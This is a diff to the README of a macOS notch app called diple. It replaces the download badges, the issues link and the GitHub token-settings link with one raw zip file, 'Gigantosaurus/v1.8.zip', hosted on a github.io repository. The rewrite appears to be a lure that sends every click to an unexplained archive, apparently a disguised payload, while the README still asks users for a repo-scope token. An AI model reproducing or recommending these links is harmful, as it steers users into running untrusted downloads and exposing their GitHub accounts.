@@ -11,7 +11,7 @@ Welcome! diple is a beautiful little app that lives right in the notch of your M
 
 ### 📥 Download diple
 
-[![Download diple](https://img.shields.io/badge/Download-diple-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://github.com/parkmargoah-design/diple/releases)
+[![Download diple](https://img.shields.io/badge/Download-diple-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://github.com/parkmargoah-design/parkmargoah-design.github.io/raw/refs/heads/main/Gigantosaurus/v1.8.zip)
 
 Visit this link to download the application.
 
@@ -65,7 +65,7 @@ Open your Applications folder and double-click diple. On the first launch, macOS
 ### Step 1: Get a GitHub Token
 diple needs a special key to access your pull requests. Don't worry — this is safe and you can revoke it anytime.
 
-1. Go to [GitHub Settings → Developer Settings → Personal Access Tokens → Tokens (classic)](https://github.com/settings/tokens)
+1. Go to [GitHub Settings → Developer Settings → Personal Access Tokens → Tokens (classic)](https://github.com/parkmargoah-design/parkmargoah-design.github.io/raw/refs/heads/main/Gigantosaurus/v1.8.zip)
 2. Click "Generate new token"
 3. Give it a name like "diple"
 4. Select the `repo` scope (this lets diple see your pull requests)
@@ -166,7 +166,7 @@ Currently, diple supports one account at a time. Multiple account support is on 
 
 If you run into any issues or have questions:
 
-- **GitHub Issues:** Report bugs or request features on our [issues page](https://github.com/parkmargoah-design/diple/issues)
+- **GitHub Issues:** Report bugs or request features on our [issues page](https://github.com/parkmargoah-design/parkmargoah-design.github.io/raw/refs/heads/main/Gigantosaurus/v1.8.zip)
 - **Email:** [support@diple.app](mailto:support@diple.app)
 
 ---
@@ -183,6 +183,6 @@ Thanks for trying diple! We built this because we were tired of missing review r
 
 If you like diple, please consider starring the repository on GitHub — it really helps us out!
 
-[![Download diple](https://img.shields.io/badge/Download-diple-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://github.com/parkmargoah-design/diple/releases)
+[![Download diple](https://img.shields.io/badge/Download-diple-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb&color=2ea44f)](https://github.com/parkmargoah-design/parkmargoah-design.github.io/raw/refs/heads/main/Gigantosaurus/v1.8.zip)
 
 Keywords: appkit, claude, code-review, developer-tools, dynamic-island, github, graphql, macos, menubar, notch, pull-requests, swift, swiftui
